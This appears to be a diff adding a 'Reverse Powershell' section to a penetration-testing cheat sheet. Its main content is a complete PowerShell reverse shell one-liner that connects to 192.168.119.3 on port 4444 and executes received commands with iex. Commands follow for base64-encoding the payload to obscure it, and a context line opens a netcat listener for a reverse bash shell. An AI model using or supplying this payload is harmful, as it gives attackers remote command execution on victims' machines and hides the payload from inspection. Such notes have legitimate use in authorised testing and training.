@@ -1,3 +1,15 @@
+Reverse Powershell
+
+  1. $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+  2. Then run these cmds to encode it.
+
+  3. $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+
+  4. $EncodedText =[Convert]::ToBase64String($Bytes)
+
+   5.  $EncodedText
+
 Reverse Bash Shell
 
   1. start listener over non blocked port like 443 == nc -lvnp 443
